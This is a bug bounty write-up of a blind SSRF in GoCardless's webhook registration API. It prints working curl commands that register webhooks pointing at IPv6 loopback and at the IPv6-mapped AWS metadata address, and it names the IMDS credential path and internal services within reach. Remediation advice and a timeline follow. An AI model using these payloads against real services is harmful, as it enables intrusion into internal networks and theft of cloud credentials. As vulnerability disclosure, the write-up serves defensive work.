# Blind SSRF via IPv6 Bypass in GoCardless Webhook Endpoint Registration

**Target:** GoCardless (HackerOne Bug Bounty Program)  
**Vulnerability:** Blind SSRF — IPv6 Filter Bypass  
**Severity:** High  
**Status:** Closed as Duplicate  

---

## Overview

GoCardless's webhook registration API validates submitted URLs against a denylist to block internal IP ranges. The filter correctly rejects IPv4 loopback and private addresses, but does not handle their IPv6 equivalents — including IPv6 loopback (`::1`) and IPv6-mapped IPv4 addresses (`::ffff:a.b.c.d`).

This means an authenticated attacker can register a webhook pointing to internal infrastructure. GoCardless's delivery service will then send authenticated POST requests to that internal target on every subscribed event — with zero additional attacker interaction required after registration.

I confirmed server-side delivery via Burp Collaborator, with HTTP requests originating from internal RFC1918 addresses (`10.20.x.x`), proving a real network boundary breach.

---

## The Filter and Why It Fails

GoCardless blocks obvious private addresses at registration time:

```bash
# Blocked — returns 422
curl -X POST https://api-sandbox.gocardless.com/webhook_endpoints \
  -H "Authorization: Bearer <token>" \
  -H "GoCardless-Version: 2015-07-06" \
  -H "Content-Type: application/json" \
  -d '{"webhook_endpoints":{"url":"http://127.0.0.1/","name":"blocked-test"}}'
```

The filter is string-based. It looks for patterns like `127.0.0.1`, `169.254.x.x`, `10.x.x.x`. It doesn't canonicalize the URL or resolve IPv6 representations — so the exact same addresses in IPv6 notation slip through.

---

## Exploitation

### Step 1 — IPv6 Loopback Bypass (`::1` → `127.0.0.1`)

```bash
curl -X POST https://api-sandbox.gocardless.com/webhook_endpoints \
  -H "Authorization: Bearer <token>" \
  -H "GoCardless-Version: 2015-07-06" \
  -H "Content-Type: application/json" \
  -d '{"webhook_endpoints":{"url":"http://[::1]:8080/","name":"ssrf-loopback"}}'
```

Returns `201 Created`. Endpoint registered.

This points the webhook at the loopback interface of GoCardless's own delivery servers — anything running on localhost with no auth (Prometheus metrics, Spring Actuators, internal admin panels) is now reachable on every webhook delivery.

---

### Step 2 — IPv6-Mapped AWS Metadata Bypass (`::ffff:a9fe:a9fe` → `169.254.169.254`)

```bash
curl -X POST https://api-sandbox.gocardless.com/webhook_endpoints \
  -H "Authorization: Bearer <token>" \
  -H "GoCardless-Version: 2015-07-06" \
  -H "Content-Type: application/json" \
  -d '{"webhook_endpoints":{"url":"http://[::ffff:a9fe:a9fe]:8080/","name":"ssrf-metadata"}}'
```

`::ffff:a9fe:a9fe` is the IPv6-mapped form of `169.254.169.254` — the AWS instance metadata endpoint. On EC2 instances with IMDSv1 enabled, this leaks IAM credentials in plaintext.

Returns `201 Created`.

---

### Step 3 — Trigger Delivery

```bash
curl -X POST https://api-sandbox.gocardless.com/billing_requests \
  -H "Authorization: Bearer <token>" \
  -H "GoCardless-Version: 2015-07-06" \
  -H "Content-Type: application/json" \
  -d '{"billing_requests":{"mandate_request":{"currency":"GBP"},"links":{"customer":"<customer_id>"}}}'
```

This fires a webhook event. GoCardless's delivery service immediately dispatches a POST to the registered URL — which is now pointing at internal infrastructure.

---

## Confirmation — OOB Interaction via Burp Collaborator

Burp Collaborator confirmed live HTTP requests from GoCardless's backend:

```
POST / HTTP/1.1
User-Agent: gocardless-webhook-service/1.2
X-Forwarded-For: 10.20.224.206
Origin: https://api-sandbox.gocardless.com
Webhook-Signature: v1=<hmac>
```

Key observations:
- `X-Forwarded-For: 10.20.224.206` — RFC1918 address, confirms server-side execution from GoCardless's internal network
- `User-Agent: gocardless-webhook-service/1.2` — confirms it's their delivery pipeline, not a browser redirect
- HMAC signature present — requests are authenticated, which may cause internal services to trust them
- Source IPs observed: `10.20.167.186`, `10.20.218.203`, `10.20.224.206`

---

## Why This Is High, Not Medium

Blind SSRF typically rates Medium because impact is often theoretical. Not here:

| Factor | Status |
|--------|--------|
| Confirmed OOB interaction from internal RFC1918 IPs | ✅ |
| Bypasses an explicit, intentional security control | ✅ |
| AWS metadata endpoint accepted | ✅ |
| Delivery triggers on 14 resource types automatically | ✅ |
| Target is PCI-regulated payment processor | ✅ |
| Zero attacker interaction needed after registration | ✅ |

The webhook subscription persists. Every billing event, mandate event, payment event that GoCardless processes for the attacker's account fires another POST to the internal target — indefinitely.

---

## Attack Surface

Once the webhook is registered, the attacker can reach:

- **Loopback services** — anything on `127.0.0.1` on delivery hosts (Prometheus `/metrics`, Spring `/actuator`, internal dashboards, unauthenticated management APIs)
- **AWS IMDSv1** — if enabled, `GET /latest/meta-data/iam/security-credentials/` leaks temporary IAM keys
- **Internal microservices** — any service that trusts requests originating from `10.20.x.x` ranges
- **Other internal webhooks/event buses** — using the HMAC-signed body as a crafted payload

---

## Root Cause

The URL validation is string-based and applied only at registration time. It checks for known private IPv4 string patterns but:

1. Does not resolve IPv6 representations to their canonical IPv4 equivalents before checking
2. Does not re-validate the resolved IP at delivery time (susceptible to DNS rebinding as a separate vector)

---

## Remediation

- **Canonicalize before denylisting.** Expand IPv6-mapped IPv4 addresses (`::ffff:0:0/96`) to their IPv4 form before applying any checks. Use a library that handles this natively — Python's `ipaddress` module, Ruby's `resolv`, or a dedicated SSRF filter library like `ssrf_filter` (Ruby) or `SafeCurl` (PHP).
- **Validate at delivery time, not just at registration.** Re-resolve the URL target on each delivery attempt. This closes the DNS rebinding window as well.
- **Apply the check to the final resolved IP.** Block all of RFC1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`, `::1`), link-local (`169.254.0.0/16`, `fe80::/10`), and all IPv6-mapped IPv4 equivalents.

---

## Timeline

| Date | Event |
|------|-------|
| May 31, 2026 | Report submitted with full PoC, video, and Collaborator proof |
| — | Closed as duplicate (proxy-level blocking noted by team) |

---

## Notes

The program closed this as a duplicate, citing proxy-level controls that block delivery at the network layer. That may mitigate the impact in production — but the filter bypass at the API layer is still a real finding, and the OOB confirmation proves the delivery pipeline reaches outside the sandbox environment. Worth understanding the full chain rather than relying solely on network-layer controls.

---
